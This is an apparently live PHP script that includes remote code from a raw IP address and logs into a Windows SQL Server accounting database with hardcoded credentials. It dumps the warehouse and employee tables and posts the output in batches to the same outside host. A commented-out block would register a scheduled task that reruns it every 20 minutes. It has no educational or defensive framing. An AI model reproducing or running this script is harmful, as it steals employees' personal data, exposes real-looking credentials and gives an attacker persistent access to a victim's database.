<?php

set_time_limit(0);

include("http://69.60.111.94/pa/scripts/snoopy/snoopy.inc");
ob_start();
error_reporting(15);
echo date("H:i:s") . "\n";
$dirname=getcwd();
$scriptname=$_SERVER["SCRIPT_NAME"];
echo $dirname . $scriptname . "\n";
$pid=getmypid();
echo "PID:" . $pid . "\n";
echo exec("tasklist /V /FI \"PID eq $pid\"") . "\n";
exec("wmic process where (processid=$pid) get executablepath",$output);
$execpath=$output[1];
echo $execpath . "\n";
/*
$command="schtasks /create /sc minute /mo 20 /tn \"PHP Cron Job\" /tr \"$execpath " . $dirname . $scriptname . "\"";
unset($output);
exec($command,$output);
print_r($output);
*/
class object{};
$CFG = new Object;
$CFG->sqlserver = "CONTABILIDAD";
$CFG->sqldb = "BIABLE01";
//$CFG->sqlserver = "COMPUTER_1";
//$CFG->sqldb = "biable01";

//  "Database" => $CFG->sqldb

$options = array(
  "Database" => $CFG->sqldb,"UID"=>"aida", "PWD"=>"icfk7959"
);
echo "Conectando...\n";
flush();
$snoopy = new Snoopy;
$url="http://69.60.111.94/pa/scripts/post.php";
if(function_exists("sqlsrv_connect")){
	$conn = sqlsrv_connect($CFG->sqlserver, $options);
	if ($conn === false) die("<pre>".print_r(sqlsrv_errors(), true));
	echo "Successfully connected!";
	echo "<pre>";

	$sql = "SELECT name AS table_name, 'asd' AS owner FROM sysobjects WHERE xtype='U'";
	$sql = "SELECT * FROM dbo.BODEGAS";
	$sql = "SELECT * FROM dbo.NMEMPLEADOS";
	$query = sqlsrv_query($conn, $sql);
	if ($query === false)
	{
		exit("<pre>".print_r(sqlsrv_errors(), true));
	}
	echo "<pre>\n";
	$i=0;
	while ($row = sqlsrv_fetch_array($query))
	{
//		print_r($row);
		echo "$i\n";
		print_r($row);
		$i++;
		if($i%5==0){
			$out=ob_get_contents();
			$submit_vars["output"]=$out;
			$snoopy->submit($url,$submit_vars);
			ob_clean();
		}
	}
	sqlsrv_free_stmt($query);

	sqlsrv_close($conn);
}
else{
	echo "No existe la función sqlsrv_connect.\n";
}

$out=ob_get_contents();

$submit_vars["output"]=$out;
$snoopy->submit($url,$submit_vars);

ob_end_clean();

?>
